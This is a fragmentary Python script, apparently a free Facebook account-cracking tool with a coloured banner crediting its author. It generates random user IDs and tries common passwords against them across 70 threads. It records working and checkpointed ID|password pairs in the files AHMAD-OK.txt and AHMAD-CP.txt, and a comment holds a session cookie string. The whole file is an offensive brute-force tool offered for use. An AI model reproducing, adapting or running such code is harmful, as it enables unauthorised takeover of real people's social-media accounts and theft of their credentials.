...
\033[1;32m888888b.    .d8888b.  888    d8P  
888  "88b  d88P  Y88b 888   d8P   
888  .88P         888 888  d8P    
8888888K.       .d88P 888d88K     
888  "Y88b  .od888P"  8888888b    
888    888 d88P"      888  Y88b   
888   d88P 888"       888   Y88b  
8888888P"  888888888  888    Y88b 

         \033[1;35m »†ᶟ 𝚫ħ𝐌𝚵̸𝕯 »❯ 
    
\33[1;37m----------------------------------------------
   \033[1;32mOWNER     \033[1;31m➟  \033[1;32mAHMAD HASSAN
   \033[1;32mFACBOOK   \033[1;31m➟  \033[1;32mAHMAD 
   \033[1;32mGITHUB    \033[1;31m➟  \033[1;32mAHMAD_KHAN404 
   \033[1;32mTOOL TYP  \033[1;31m➟  \033[1;32mFREE
\x1b[1;97m   \033[1;32mVERSION   \033[1;31m➟  \033[1;33m0.1
\33[1;37m----------------------------------------------""")
...
def annu():
    ...
    print('\x1b[1;97m[3] Random Method \x1b[1;92m3     \033[1;32m[BEST]')
...
def m1():
    ...
    with ThreadPool(max_workers=70) as yaari:
        ...
        for guru in user:
            uid = kode+guru
            pwx=[guru,'khankhan','khan12345','free fire','pakistan','alikhan12345','khan1122khan12']
...
def rcrack(uid,pwx,tl):
    ...
    # 'cookie': 'datr=0d12ZOd7p3IBV6fyrBXv8Iz-; sb=0d12ZC7cIwf5BvI3TnP3sHoo; dpr=2; locale=en_US; vpd=v1%3B680x360x2; wl_cbv=v2%3Bclient_version%3A2267%3Btimestamp%3A1685797213; dnonce=AWkQDkD8DPbDin1FzQqaIUXjy8sdCeOoLWKBr_RTARYzxznhDcqVaTuROSPZFGZ75UkBtrlSRa932tjK5jFVfTP3; m_pixel_ratio=2; wd=360x680; fr=0Io798eG8abfgM4v4.AWUVf1R-GhAL97itDjjHllvjCTg.Bkdt4r.fD.AAA.0.0.BkfI8b.AWUKQdNe0jY',
    ...
    'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X x.y; rv:42.0) Gecko/20100101 Firefox/42.0',
            ...
            if 'c_user' in log_cookies:
                ...
                uid = coki[151:166]
                print('\033[1;32m[AHMAD-OK] '+uid+'|'+ps+'\033[0;97m')
                open('AHMAD-OK.txt', 'a').write(uid+' | '+ps+ '\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:152]
                print('\033[1;33m[HASSAN-CP] '+uid+' | '+ps+'\x1b[1;97m')
                open('AHMAD-CP.txt', 'a').write(uid+' | '+ps+'\n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r[\033[1;97mMR.AHMAD \033[1;97m] %s|\33[1;32mOK:- %s \r'%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
